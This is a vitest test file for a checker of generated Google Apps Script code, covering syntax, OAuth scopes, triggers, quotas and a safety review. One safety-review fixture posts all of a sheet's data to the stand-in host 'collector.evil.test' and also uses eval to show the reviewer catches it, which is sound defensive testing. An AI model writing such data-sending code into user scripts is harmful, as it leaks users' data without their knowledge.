import { describe, expect, test } from "vitest";
import { triggerWarnings } from "../src/logic/checkTrigger";
import { codeOnly } from "../src/logic/code";
import { quotaNotes } from "../src/logic/quotas";
import { reviewScript } from "../src/logic/safety";
import { compareScopes, detectScopes } from "../src/logic/scopes";
import { checkSyntax } from "../src/logic/syntax";
import golden from "../evals/golden.json";

const script = (golden as Record<string, { script?: string }>)["email-when-done"].script!;

describe("syntax check (acorn, ES2022, script mode)", () => {
  test("valid V8 code passes; an error gives its line and column", () => {
    expect(checkSyntax(script)).toEqual({ ok: true });
    const bad = checkSyntax("function a() {\n  const x = ;\n}");
    expect(bad).toMatchObject({ ok: false, line: 2, column: 13 });
  });
  test("import/export are rejected (Apps Script files are scripts, not modules)", () => {
    expect(checkSyntax("import x from 'y';").ok).toBe(false);
  });
});

describe("scopes from our own table", () => {
  test("detects services in code, not in comments or strings", () => {
    const s = "// GmailApp is not used\nfunction f() { const t = 'DriveApp'; MailApp.sendEmail('a@b.co','s','b'); UrlFetchApp.fetch('https://x.test'); }";
    expect(detectScopes(s).map((x) => x.service)).toEqual(["MailApp", "UrlFetchApp"]);
    expect(codeOnly("a('x') // y").length).toBe("a('x') // y".length);
  });
  test("@OnlyCurrentDoc narrows the spreadsheet scope; trigger management needs script.scriptapp", () => {
    const s = "/** @OnlyCurrentDoc */\nfunction f(){ SpreadsheetApp.getActive(); ScriptApp.newTrigger('f').timeBased().everyHours(1).create(); }";
    expect(detectScopes(s).map((x) => x.scope)).toEqual(["https://www.googleapis.com/auth/spreadsheets.currentonly", "https://www.googleapis.com/auth/script.scriptapp"]);
  });
  test("a model list that differs is reported both ways", () => {
    expect(compareScopes(["https://mail.google.com/"], ["https://www.googleapis.com/auth/gmail.send"])).toEqual({ extra: ["https://www.googleapis.com/auth/gmail.send"], missing: ["https://mail.google.com/"] });
    expect(compareScopes(["https://mail.google.com/"], ["https://mail.google.com"])).toBeNull();
  });
});

describe("safety review (always runs)", () => {
  test("flags e-mail addresses and hosts that are not in the request, eval, Function( and sheet data sent to a URL", () => {
    const s = `function f(){ const d = SpreadsheetApp.getActiveSheet().getDataRange().getValues();
  UrlFetchApp.fetch('https://collector.evil.test/x', { method: 'post', payload: JSON.stringify(d) });
  MailApp.sendEmail('boss@corp.test', 'x', 'y'); eval('1'); const g = Function('return 1'); }`;
    const items = reviewScript(s, "send the sheet to https://api.example.com");
    const texts = items.map((i) => i.text).join("\n");
    expect(texts).toMatch(/boss@corp\.test/);
    expect(texts).toMatch(/collector\.evil\.test/);
    expect(texts).toMatch(/sends it to an external address/);
    expect(texts).toMatch(/runs text as code \(eval\)/);
    expect(texts).toMatch(/runs text as code \(Function\)/);
    expect(items.find((i) => i.text.includes("boss@"))!.line).toBe(3);
  });
  test("addresses and hosts that the visitor typed are not flagged", () => {
    const items = reviewScript("function f(){ MailApp.sendEmail('sam@example.com','s','b'); UrlFetchApp.fetch('https://api.example.com/rates'); }", "email sam@example.com with data from https://api.example.com/rates");
    expect(items.filter((i) => i.level === "danger")).toEqual([]);
    expect(reviewScript("const URL_ = 'https://api.example.com/r';\nfunction f(){ UrlFetchApp.fetch(URL_); }", "https://api.example.com/r")).toEqual([]);
    expect(reviewScript("function f(u){ UrlFetchApp.fetch(u); }", "x")[0].text).toMatch(/from a variable/);
  });
});

describe("trigger checks and quotas", () => {
  test("a simple onEdit that sends mail is flagged; an installable trigger on onEdit is flagged", () => {
    expect(triggerWarnings("function onEdit(e){ MailApp.sendEmail('a@b.co','s','b'); }", "simple-onedit")[0]).toMatch(/cannot use MailApp/);
    expect(triggerWarnings("function f(e){}", "simple-onedit")[0]).toMatch(/needs a function named onEdit/);
    expect(triggerWarnings("function onEdit(e){}", "installable-onedit")[0]).toMatch(/runs it twice/);
    expect(triggerWarnings(script, "installable-onedit")).toEqual([]);
  });
  test("quota notes follow the services and the trigger", () => {
    expect(quotaNotes(script, "installable-onedit").map((q) => q.id)).toEqual(["runtime", "triggerTime", "triggers", "mail"]);
    expect(quotaNotes("function onEdit(e){}", "simple-onedit").map((q) => q.id)).toEqual(["runtime", "simple"]);
  });
});
